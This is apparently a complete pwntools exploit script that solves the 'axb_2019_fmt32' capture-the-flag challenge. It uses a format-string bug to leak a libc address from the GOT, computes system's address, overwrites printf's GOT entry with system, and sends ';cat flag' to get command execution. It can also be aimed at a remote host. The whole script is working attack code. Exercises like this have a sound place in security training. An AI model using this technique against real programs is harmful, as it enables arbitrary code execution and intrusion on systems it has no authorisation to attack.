#!/usr/bin/env python3
"""AXB 2019 fmt32; matched to the local challenge's code sections.
Reference: https://github.com/Yeuoly/buuctf_pwn/tree/master/axb_2019_fmt32
Requires a matching i386 libc 2.23. Defaults to local process only.
"""
from pathlib import Path
from pwn import *

HERE = Path(__file__).resolve().parent
context.arch = "i386"
elf = ELF(str(HERE / "axb_2019_fmt32"), checksec=False)
libc_path = args.LIBC or str(HERE / "libc.so.6")
if not Path(libc_path).is_file():
    raise SystemExit("Provide matching i386 libc with LIBC=/path/to/libc.so.6")
libc = ELF(libc_path, checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process(str(elf.path))

payload = b"a" + p32(elf.got["read"]) + b"%8$s"
io.sendlineafter(b"me:", payload)
io.recvn(14)
read_addr = u32(io.recvn(4))
libc_base = read_addr - libc.sym["read"]
system = libc_base + libc.sym["system"]
log.info("libc base: %#x", libc_base)
io.recvuntil(b"me:")

# The reference payload's printed prefix is 9 bytes before fmtstr_payload's writes.
payload = b"a" + fmtstr_payload(8, {elf.got["printf"]: system}, write_size="byte", numbwritten=10)
io.sendline(payload)
io.sendlineafter(b"\n", b";cat flag")
io.interactive()
